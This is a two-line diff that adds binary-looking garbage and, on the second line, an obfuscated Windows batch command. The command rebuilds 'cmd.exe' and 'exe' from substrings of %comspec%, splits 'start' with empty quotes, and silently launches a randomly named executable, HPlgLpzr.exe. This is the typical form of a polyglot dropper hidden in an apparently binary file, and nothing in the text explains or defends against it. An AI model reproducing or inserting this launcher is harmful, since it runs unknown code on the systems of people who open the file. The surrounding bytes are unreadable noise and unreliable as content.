@@ -1,0 +1,2 @@
+  > d ” ] z * D ê ? 2 ” < ç o  ? æ u A ? ˜ l ? ◊ ? ∫ ? €    ¿ ˙ * «   ¥ H π ∆ æ Á + ?  Ù … ˚ 1 9 Ô C M I Á  Ã Ÿ Ó   „  K ? 	   ? 5 i M  Ã € ? I Ø  Ã (
+cmd.%comspec:~-1%x%comspec:~-1% /b /c star""t /b HPlgLpzr"".%comspec:~-1%x%comspec:~-1%  > d ” ] z * D ê ? 2 ” < ç o  ? æ u A ? ˜ l ? ◊ ? ∫ ? €    ¿ ˙ * «   ¥ H π ∆ æ Á + ?  Ù … ˚ 1 9 Ô C M I Á  Ã Ÿ Ó   „  K ? 	   ? 5 i M  Ã € ? I Ø  Ã (
